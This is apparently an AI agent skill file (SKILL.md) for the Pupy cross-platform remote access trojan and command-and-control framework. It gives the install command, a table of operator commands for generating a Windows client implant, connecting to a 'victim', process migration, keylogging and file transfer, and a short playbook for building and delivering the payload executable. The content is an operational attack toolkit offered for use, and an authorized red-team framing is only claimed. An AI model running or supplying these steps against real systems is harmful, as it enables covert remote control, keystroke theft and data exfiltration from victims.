---
name: pupy-rat
description: "Pupy: Cross-platform remote control implant. Signals: C2, command and control, start controller, generate client, process migration."
zh-signals: "Pupy: 跨平台远控上线。信号:c2,命令控制,启动控制端,生成客户端,进程迁移。"
when-to-use: >-
  Use when operating an authorized red-team engagement that requires a cross-platform C2
  implant, from starting the controller and generating clients to session interaction and
  process migration.
---

# Pupy

- Attack Category: C35 C2 Frameworks and Remote Control
- Upstream Repository: https://github.com/n1nj4sec/pupy
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/n1nj4sec/pupy && cd pupy && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./pupysh.py` | Start the controller |
| `gen -f client -O windows -A x64` | Generate a client |
| `connect victim` | Check-in |
| `run migrate` | Process migration |
| `run keylogger_start` | Keylogging |
| `download / upload` | File transfer |

## Attack Scenario Playbook

### Cross-Platform Remote Control Check-In

```bash
pupysh> gen -f client -O windows -A x64 -o w.exe
# After delivery run pupysh> sessions; interact <id> to enter the session
```

## Notes

Pure Python with fully in-memory loading; project maintenance has slowed, so verify Python compatibility on the target before use.
